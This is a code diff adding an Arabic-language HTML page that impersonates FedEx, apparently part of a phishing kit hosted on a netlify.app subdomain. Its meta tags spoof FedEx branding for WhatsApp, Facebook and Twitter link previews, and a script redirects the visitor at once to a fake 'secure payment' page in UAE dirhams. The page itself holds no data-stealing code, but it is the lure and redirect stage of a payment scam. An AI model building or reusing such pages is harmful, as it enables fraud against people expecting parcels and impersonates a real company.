@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <!-- Primary Meta Tags -->
+    <title>دفع آمن - FedEx الشحن الدولي الموثوق 📦</title>
+    <meta name="title" content="دفع آمن - FedEx الشحن الدولي الموثوق 📦">
+    <meta name="description" content="FedEx - رائدة الشحن الدولي - ادفع بأمان واحصل على خدمات شحن موثوقة مع تتبع فوري وضمان الوصول في الموعد المحدد ⏰">
+    
+    <!-- Open Graph / Facebook / WhatsApp -->
+    <meta property="og:type" content="website">
+    <meta property="og:site_name" content="منصة الدفع الآمن">
+    <meta property="og:locale" content="ar_AR">
+    <meta property="og:title" content="دفع آمن - FedEx الشحن الدولي الموثوق 📦">
+    <meta property="og:description" content="FedEx - رائدة الشحن الدولي - ادفع بأمان واحصل على خدمات شحن موثوقة مع تتبع فوري وضمان الوصول في الموعد المحدد ⏰">
+    <meta property="og:image" content="https://melodic-squirrel-d354d7.netlify.app/og-fedex.jpg">
+    <meta property="og:image:secure_url" content="https://melodic-squirrel-d354d7.netlify.app/og-fedex.jpg">
+    <meta property="og:image:width" content="1200">
+    <meta property="og:image:height" content="630">
+    <meta property="og:image:type" content="image/jpeg">
+    <meta property="og:image:alt" content="FedEx - الشحن الدولي">
+    
+    <!-- Twitter -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="دفع آمن - FedEx الشحن الدولي الموثوق 📦">
+    <meta name="twitter:description" content="FedEx - رائدة الشحن الدولي - ادفع بأمان واحصل على خدمات شحن موثوقة">
+    <meta name="twitter:image" content="https://melodic-squirrel-d354d7.netlify.app/og-fedex.jpg">
+    
+    <script>
+        // Get the actual payment URL from the current location
+        const currentUrl = new URL(window.location.href);
+        
+        // Extract ID from path (e.g., /pay-fedex/abc123.html -> abc123)
+        const pathParts = currentUrl.pathname.split('/');
+        const htmlFile = pathParts[pathParts.length - 1];
+        const linkId = htmlFile.replace('.html', '');
+        
+        // Build the actual payment page URL
+        const actualUrl = `${currentUrl.origin}/pay/${linkId}/recipient?company=fedex&currency=AED&title=Payment%20FedEx`;
+        
+        // Update og:url meta tag before WhatsApp reads it
+        const ogUrlMeta = document.querySelector('meta[property="og:url"]');
+        if (ogUrlMeta) {
+            ogUrlMeta.setAttribute('content', actualUrl);
+        }
+        
+        // Redirect to actual page immediately
+        window.location.replace(actualUrl);
+    </script>
+    
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            background: linear-gradient(135deg, #4b0082 0%, #ff6600 100%);
+            color: white;
+            text-align: center;
+        }
+        .spinner {
+            border: 4px solid rgba(255, 255, 255, 0.3);
+            border-top: 4px solid white;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div>
+        <div class="spinner"></div>
+        <h1>FedEx - جاري التحميل...</h1>
+        <p>سيتم تحويلك تلقائياً إلى صفحة الدفع</p>
+    </div>
+</body>
+</html>
